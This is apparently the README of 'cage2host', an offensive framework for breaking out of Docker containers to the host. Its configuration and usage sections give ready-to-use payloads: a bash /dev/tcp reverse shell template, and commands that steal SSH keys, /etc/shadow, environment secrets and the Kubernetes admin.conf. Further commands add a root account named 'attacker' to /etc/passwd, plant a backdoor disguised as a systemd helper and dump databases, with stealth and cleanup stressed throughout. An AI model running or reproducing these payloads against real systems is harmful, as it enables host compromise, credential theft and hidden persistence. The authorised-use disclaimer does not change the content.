## Cage2Host Advanced Container Escape Automation Framework
![task_01kakjc7pcf2vrdb5c4bn1yy9c_1763741081_img_1](https://github.com/user-attachments/assets/bd76303e-8442-4f51-b4d2-86993e65d46c)


<div align="center">

**Advanced Container Escape Automation Framework**

*A sophisticated red team toolkit for automated container breakout operations*

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Bash](https://img.shields.io/badge/bash-4.0%2B-green.svg)](https://www.gnu.org/software/bash/)
[![Platform](https://img.shields.io/badge/platform-linux-lightgrey.svg)](https://www.kernel.org/)

[Features](#-core-features) • [Architecture](#-architecture) • [Installation](#-installation) • [Documentation](#-documentation) • [Examples](#-tactical-examples)

</div>

---

## 📋 Overview

**cage2host** is a modular exploitation framework engineered for offensive container security operations. It provides a sophisticated command-and-control interface for executing container escape techniques, automating post-exploitation tasks, and orchestrating complex attack chains against containerized environments.

The framework abstracts the complexity of container breakout techniques into reusable modules, enabling security professionals to rapidly prototype and execute exploitation scenarios with minimal manual intervention.

### 🎯 Core Features

<table>
<tr>
<td width="50%">

**Dual-Mode Architecture**
- **Utility Engine**: Payload orchestration with template-based command injection
- **Random Execution**: Direct module invocation with auto-chaining capabilities

</td>
<td width="50%">

**Exploitation Capabilities**
- Docker socket privilege escalation
- Privileged container breakout
- Host filesystem manipulation
- Credential harvesting automation

</td>
</tr>
<tr>
<td>

**Extensibility**
- Plugin-based exploit modules
- Custom payload injection system
- Theme engine for operational branding
- Route-based execution flow control

</td>
<td>

**Operational Features**
- Base64-encoded command transport
- Automated cleanup and stealth operations
- Multi-stage exploitation pipelines
- Structured logging and output parsing

</td>
</tr>
</table>

---

## 🏗️ Architecture

### System Design

```
┌─────────────────────────────────────────────────────────────┐
│                      cage2host Framework                     │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────────┐              ┌──────────────────┐    │
│  │   Utility Mode   │              │   Random Mode    │    │
│  │                  │              │                  │    │
│  │ • Payload Engine │              │ • Direct Exec    │    │
│  │ • Template Inject│              │ • Auto-chaining  │    │
│  │ • Task Automation│              │ • Module Scanner │    │
│  └────────┬─────────┘              └────────┬─────────┘    │
│           │                                  │               │
│           └──────────────┬───────────────────┘               │
│                          ▼                                   │
│           ┌──────────────────────────────┐                  │
│           │    Exploitation Core Layer    │                  │
│           │                                │                  │
│           │ • Route Manager               │                  │
│           │ • Config Parser               │                  │
│           │ • Output Handler              │                  │
│           └──────────────┬─────────────────┘                  │
│                          ▼                                   │
│           ┌──────────────────────────────┐                  │
│           │      Exploit Modules         │                  │
│           │                                │                  │
│           │ ├─ Docker Socket Exploits    │                  │
│           │ ├─ Privileged Container Esc  │                  │
│           │ ├─ Mount-based Techniques    │                  │
│           │ └─ Custom User Modules       │                  │
│           └──────────────────────────────┘                  │
└─────────────────────────────────────────────────────────────┘
```

### Component Overview

| Component | Purpose | Location |
|-----------|---------|----------|
| **Utility Engine** | Payload orchestration and template-based exploitation | `utility/utility.sh` |
| **Random Executor** | Direct module execution and auto-chaining | `core/main.sh` |
| **Route Manager** | Dynamic module routing and discovery | `core/routes.sh` |
| **Config System** | Centralized configuration management | `config/*.conf` |
| **Exploit Modules** | Individual exploitation techniques | `bin/`, `modules/` |
| **Theme Engine** | Operational UI customization | `themes/` |

---

## 🚀 Installation

### Prerequisites

```bash
# System Requirements
- Linux kernel 3.10+ (preferably 4.x+)
- Bash 4.0 or higher
- Docker environment (target)
- Standard GNU utilities (base64, curl, grep, sed, awk)
```

### Quick Installation

```bash
# Clone repository
git clone https://github.com/yourusername/cage2host.git
cd cage2host

# Set permissions
chmod +x start.sh utility/utility.sh bin/*.sh

# Install dependencies and build
make install
make build

# Verify installation
./start.sh --help
```

### Advanced Build Options

```bash
# Build with optimization
make build OPTIMIZE=true

# Build standalone binary
make binary

# Install system-wide (requires root)
sudo make install-system

# Clean build artifacts
make clean
```

---

## 📖 Documentation

### Command-Line Interface

```
Usage: ./start.sh [MODE] [OPTIONS]

OPERATIONAL MODES:
  --random-mode              Execute random exploitation engine
  --utility-mode             Launch utility payload orchestrator

GLOBAL OPTIONS:
  --help, -h                 Display comprehensive help
  --version                  Show version information
  --verbose, -v              Enable verbose logging
  --silent                   Suppress non-critical output
```

---

## 🎯 Utility Mode - Payload Orchestration Engine

### Overview

Utility Mode implements a sophisticated payload delivery system that decouples exploitation vectors from payload execution. This architecture enables complex multi-stage attacks through template-based command injection.

### Core Concepts

#### 1. Exploitation Vectors
Defined in `config/vuln.conf`, vectors map attack techniques to their implementation:

```bash
# Container escape via Docker socket
socket=bin/interactive-socket.sh

# Privileged container breakout
privileged_container=bin/privileged.sh

# Custom exploitation vector
custom_mount=bin/custom-mount-escape.sh
```

#### 2. Payload Templates
Defined in `config/payload.conf`, payloads support dynamic variable interpolation:

```bash
# Command execution with environment awareness
run='/bin/sh -c "whoami; hostname; id; uname -a; cat /etc/os-release"'

# Reverse shell with dynamic IP/PORT injection
revshell='bash -c "exec bash -i &>/dev/tcp/IP/PORT <&1"'

# File exfiltration with structured output markers
extract_file='printf "BEGIN-EXTRACT\n"; base64 /host/{{SOURCE}}; printf "\nEND-EXTRACT\n"'

# File upload with integrity verification
upload_file="pwd && echo '{{CONTENT}}' | base64 -d > '/host/{{DEST}}' && echo 'Upload complete:' && ls -lh '/host/{{DEST}}' || echo 'Upload failed'"

# Multi-command chain with error handling
recon='set -e; whoami || true; id || true; ip a || true; mount || true; env || true'

# Credential harvesting
dump_ssh='tar czf - /host/root/.ssh /host/home/*/.ssh 2>/dev/null | base64 -w0'
```

#### 3. Template Variables

| Variable | Description | Example |
|----------|-------------|---------|
| `IP` | Target IP address | `192.168.1.100` |
| `PORT` | Target port number | `4444` |
| `{{SOURCE}}` | Source file path | `/etc/shadow` |
| `{{DEST}}` | Destination file path | `/tmp/malware.elf` |
| `{{CONTENT}}` | Base64-encoded file content | `SGVsbG8gV29ybGQ=` |

### Command Reference

```bash
# Display help and usage
./utility/utility.sh --help

# List available exploitation vectors
./utility/utility.sh --list-vulns

# List available payload templates
./utility/utility.sh --list-payloads

# Execute command via specific vector
./utility/utility.sh --vuln <vector> --cmd "<command>"

# Use predefined payload
./utility/utility.sh --vuln <vector> --<payload_key> [OPTIONS]
```

### Tactical Examples

#### Reconnaissance Phase

```bash
# Initial system enumeration
./utility/utility.sh --vuln socket --run

# Network discovery
./utility/utility.sh --vuln privileged_container --cmd "ip route; arp -a; netstat -tuln"

# Process enumeration
./utility/utility.sh --vuln socket --cmd "ps auxf; systemctl list-units"
```

#### Credential Harvesting

```bash
# Extract SSH credentials
./utility/utility.sh --vuln socket --dump_ssh --out ssh-creds.b64

# Extract shadow file
./utility/utility.sh --vuln privileged_container \
  --extract_file --source /etc/shadow --decode-out shadow.txt

# Dump environment variables
./utility/utility.sh --vuln socket --cmd "env; cat /proc/*/environ | tr '\0' '\n'"
```

#### Persistence & Post-Exploitation

```bash
# Establish reverse shell
./utility/utility.sh --vuln socket --revshell --ip 10.0.0.1 --port 4444

# Upload backdoor
./utility/utility.sh --vuln privileged_container \
  --upload_file --file /local/backdoor.elf --dest /usr/local/bin/systemd-helper

# Modify system files
./utility/utility.sh --vuln socket --cmd "echo 'attacker:x:0:0::/root:/bin/bash' >> /host/etc/passwd"
```

#### Data Exfiltration

```bash
# Extract sensitive files
./utility/utility.sh --vuln socket \
  --extract_file --source /etc/kubernetes/admin.conf --out k8s-admin.b64

# Compress and exfiltrate directory
./utility/utility.sh --vuln privileged_container \
  --cmd "tar czf - /host/var/lib/docker 2>/dev/null | base64 -w0" \
  --out docker-data.tar.gz.b64

# Database dump
./utility/utility.sh --vuln socket \
  --cmd "mysqldump -u root -p\$(cat /host/root/.mysql_password) --all-databases | base64 -w0"
```

---

## 🎲 Random Mode - Direct Execution Engine

### Overview

Random Mode provides low-level access to exploitation modules without payload abstraction. This mode is optimized for rapid testing, module development, and automated attack chain execution.

### Features

- **Module Discovery**: Automatic scanning and registration of exploits
- **Auto-chaining**: Sequential execution of all registered modules
- **Direct Invocation**: Execute modules by unique identifier
- **Zero Configuration**: Works with default module structure

### Command Reference

```bash
# Reset module registry
./start.sh --random-mode --reset-modules

# List available modules
./start.sh --random-mode --list-modules

# List available exploits
./start.sh --random-mode --list-exploits

# List everything
./start.sh --random-mode --list-all

# Execute specific module
./start.sh --random-mode --module MOD-012

# Execute specific exploit (requires confirmation)
./start.sh --random-mode --exploit EXP-005 --confirm

# Auto-chain execution
./start.sh --random-mode --auto
```

### Auto-Chain Mode

Auto-chain mode executes all modules in `modules/auto-mode/` sequentially:

```bash
# Prepare modules for auto-chain
mkdir -p modules/auto-mode/
cp bin/check-docker-socket.sh modules/auto-mode/01-discovery.sh
cp bin/privileged-escape.sh modules/auto-mode/02-exploit.sh
cp bin/establish-persistence.sh modules/auto-mode/03-persist.sh

# Execute chain
./start.sh --random-mode --auto
```

---

## 🔧 Advanced Configuration

### Payload Configuration (`config/payload.conf`)

#### Syntax

```bash
# Single-line payloads
payload_name='command string with {{VARIABLES}}'

# Multi-line payloads (using backslash continuation)
complex_payload='command1 | \
  command2 | \
  command3 {{VARIABLE}}'

# Commented payloads (disabled)
#disabled_payload='will not be loaded'
```

#### Best Practices

1. **Idempotency**: Design payloads to be safely re-executable
2. **Error Handling**: Include fallback logic for failed operations
3. **Stealth**: Minimize command output and system modifications
4. **Atomicity**: Ensure commands complete or fail cleanly

### Vulnerability Configuration (`config/vuln.conf`)

```bash
# Standard format
vector_name=relative/path/to/exploit.sh

# Examples
docker_socket=bin/socket-escape.sh
privileged_container=bin/privileged-breakout.sh
kubelet_rw=modules/kubernetes/kubelet-rw-escape.sh
```

### Route Configuration (`config/routes.conf`)

Routes are auto-generated but can be customized:

```bash
# Module registration format
MOD-001=modules/auto-mode/check-capabilities.sh
EXP-001=bin/docker-socket-escape.sh

# Custom routes
CUSTOM-RECON=custom/my-recon-module.sh
```

---

## 🛠️ Developing Custom Exploits

### Exploit Script Template

All exploits for Utility Mode must implement the `utility-exec-function` interface:

```bash
#!/usr/bin/env bash
# ============================================================
#                  CUSTOM EXPLOIT MODULE
#              [Brief Attack Vector Description]
# ============================================================
# 
# Attack Vector: [e.g., Docker socket privilege escalation]
# Prerequisites: [e.g., Access to /var/run/docker.sock]
# Impact: [e.g., Full host compromise with root privileges]
# 
# Utility Mode: Compatible
# Random Mode: Compatible
# ============================================================

set -euo pipefail

# Source framework utilities
BASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
source "$BASE_DIR/themes/theme.sh" 2>/dev/null || true

# ============================================================
# REQUIRED: Utility Mode Interface
# ============================================================
utility-exec-function() {
    local encoded_command="$*"
    
    # Decode base64 command
    local decoded_command
    decoded_command=$(printf "%s" "$encoded_command" | base64 --decode)
    
    info "[*] Executing: $decoded_command"
    
    # ============================================================
    # INSERT EXPLOITATION LOGIC HERE
    # ============================================================
    
    # Example: Execute via docker socket
    local output
    output=$(your_exploitation_method "$decoded_command" 2>&1)
    
    # Return structured output
    if [ $? -eq 0 ]; then
        success "[+] Command executed successfully"
        echo "$output"
    else
        error "[-] Command execution failed"
        echo "$output" >&2
        return 1
    fi
    
    # Optional: Cleanup operations
    cleanup_function
}

# ============================================================
# Module-specific helper functions
# ============================================================

your_exploitation_method() {
    local cmd="$1"
    
    # Implement your container escape technique here
    # Examples:
    # - Docker socket API calls
    # - Privileged container operations
    # - cgroup manipulation
    # - Kernel exploits
    
    echo "Exploitation output"
}

cleanup_function() {
    # Remove artifacts, restore state, etc.
    :
}

# ============================================================
# Direct Execution Support (Random Mode)
# ============================================================

if [ "${BASH_SOURCE[0]}" = "${0}" ]; then
    if [ $# -eq 0 ]; then
        error "Usage: $0 <base64_encoded_command>"
        exit 1
    fi
    
    utility-exec-function "$@"
fi
```

### Integration Checklist

- [ ] Implement `utility-exec-function` with base64 decoding
- [ ] Add descriptive header with attack vector documentation
- [ ] Source theme utilities for consistent output formatting
- [ ] Implement error handling and cleanup logic
- [ ] Add entry to `config/vuln.conf` for Utility Mode
- [ ] Test with sample payloads from `config/payload.conf`
- [ ] Verify compatibility with both execution modes
- [ ] Document prerequisites and impact in script header

### Testing Your Exploit

```bash
# Test direct execution
echo "id" | base64 | xargs ./bin/your-exploit.sh

# Test via Utility Mode
./utility/utility.sh --vuln your_exploit --cmd "whoami"

# Test with complex payload
./utility/utility.sh --vuln your_exploit --extract_file --source /etc/passwd
```

---

## 🎨 Customization & Theming

### Theme System

Themes control the visual presentation of framework output:

```bash
# themes/custom-theme.sh

# Color definitions
export RED="\033[1;31m"
export GRN="\033[1;32m"
export YEL="\033[1;33m"
export CYN="\033[1;36m"
export RST="\033[0m"

# Helper functions
success() { echo -e "${GRN}[+]${RST} $*"; }
error()   { echo -e "${RED}[-]${RST} $*"; }
info()    { echo -e "${CYN}[*]${RST} $*"; }
warn()    { echo -e "${YEL}[!]${RST} $*"; }

# Banner function
banner() {
    cat << 'EOF'
╔═══════════════════════════════════════╗
║       CAGE2HOST FRAMEWORK v2.0        ║
║   Advanced Container Escape Toolkit   ║
╚═══════════════════════════════════════╝
EOF
}
```

### Applying Custom Theme

```bash
# Edit start.sh or utility.sh
source themes/custom-theme.sh
```

---

## 📊 Project Structure

```
cage2host/
├── bin/                          # Core exploit binaries
│   ├── interactive-socket.sh     # Docker socket interactive exploit
│   ├── privileged.sh             # Privileged container escape
│   └── custom-exploits/          # User-defined exploits
│
├── build/                        # Build artifacts
│   ├── bin/                      # Compiled binaries
│   └── cache/                    # Build cache
│
├── config/                       # Framework configuration
│   ├── payload.conf              # Payload template definitions
│   ├── vuln.conf                 # Vulnerability-to-exploit mappings
│   ├── routes.conf               # Auto-generated module routes
│   ├── fun.conf                  # Easter eggs and extras
│   └── settings.conf             # Global framework settings
│
├── core/                         # Framework core components
│   ├── main.sh                   # Random mode entry point
│   ├── routes.sh                 # Route management system
│   ├── build-routes.sh           # Route builder utility
│   ├── static-routes.sh          # Static route definitions
│   └── utils.sh                  # Common utility functions
│
├── modules/                      # Exploitation modules
│   ├── auto-mode/                # Auto-chain execution modules
│   ├── mounts/                   # Mount-based exploits
│   ├── unix-socket/              # Unix socket techniques
│   ├── kubernetes/               # K8s-specific exploits
│   └── bin/                      # Module binaries (socat, etc.)
│
├── themes/                       # UI themes
│   ├── theme.sh                  # Default theme
│   ├── ninja-theme.sh            # Alternative theme
│   └── theme-template.sh         # Theme development template
│
├── utility/                      # Utility mode components
│   ├── utility.sh                # Main utility orchestrator
│   ├── parser.sh                 # Output parsing engine
│   └── output/                   # Command output storage
│       ├── raw/                  # Raw base64 outputs
│       └── decoded/              # Decoded outputs
│
├── docs/                         # Documentation
│   ├── EXPLOITATION-GUIDE.md     # Exploitation techniques
│   ├── DEVELOPMENT.md            # Development guide
│   └── PAYLOADS.md               # Payload reference
│
├── Makefile                      # Build automation
├── start.sh                      # Main framework entry point
├── LICENSE                       # License information
└── README.md                     # This file
```

---

## 🔒 Operational Security Considerations

### Legal & Ethical Use

⚠️ **CRITICAL**: This framework is designed exclusively for authorized security assessments and research.

- **Authorization Required**: Obtain explicit written permission before testing any system
- **Scope Adherence**: Stay within defined engagement boundaries
- **Data Handling**: Follow responsible disclosure practices
- **Documentation**: Maintain detailed logs of all activities for reporting

### Technical Safety

- **Isolated Testing**: Use dedicated lab environments (VMs, containers)
- **Backup & Recovery**: Ensure target systems can be restored
- **Cleanup**: Always run cleanup routines after exploitation
- **Monitoring**: Be aware of defensive tooling (EDR, SIEM, IDS/IPS)

### Operational Guidelines

1. **Pre-Engagement**: Verify authorization and scope
2. **Execution**: Use minimal necessary privileges
3. **Post-Exploitation**: Document findings, minimize persistence
4. **Reporting**: Provide detailed technical writeups

---

## 🚨 Known Limitations

- **Docker API Dependency**: Socket-based exploits require Docker API access
- **Kernel Compatibility**: Some techniques require specific kernel versions
- **Detection Risk**: Active exploitation may trigger security monitoring
- **Network Constraints**: Reverse shells require outbound connectivity
- **Resource Overhead**: Some exploits may impact system performance

---

## 🛣️ Roadmap

- [ ] Kubernetes exploitation modules (kubelet, API server)
- [ ] Advanced persistence mechanisms
- [ ] Encrypted C2 channel support
- [ ] Windows container escape techniques
- [ ] Integration with Metasploit Framework
- [ ] Web-based management interface
- [ ] Real-time monitoring and alerting
- [ ] Automated vulnerability assessment

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-exploit`)
3. **Test** your changes thoroughly
4. **Commit** with descriptive messages (`git commit -m 'Add kubelet exploit'`)
5. **Push** to your branch (`git push origin feature/amazing-exploit`)
6. **Open** a Pull Request with detailed description

### Development Setup

```bash
# Clone your fork
git clone https://github.com/yourusername/cage2host.git
cd cage2host

# Create development branch
git checkout -b dev/your-feature

# Run tests
make test

# Submit PR when ready
```

---

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

**Disclaimer**: The authors and contributors assume no liability for misuse or damage caused by this software. Users are solely responsible for compliance with applicable laws and regulations.

---

## 📚 Additional Resources

- [Container Security Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html)
- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [Kubernetes Security Guide](https://kubernetes.io/docs/concepts/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)

---

**cage2host** - *Break Free, Stay Hidden*

Made with ⚡ by security researchers, for security researchers

[Report Bug](https://github.com/bohmiiidd/cage2host/issues) • [Request Feature](https://github.com/bohmiiidd/cage2host/issues) • [Documentation](https://github.com/bohmiiidd/cage2host/wiki)
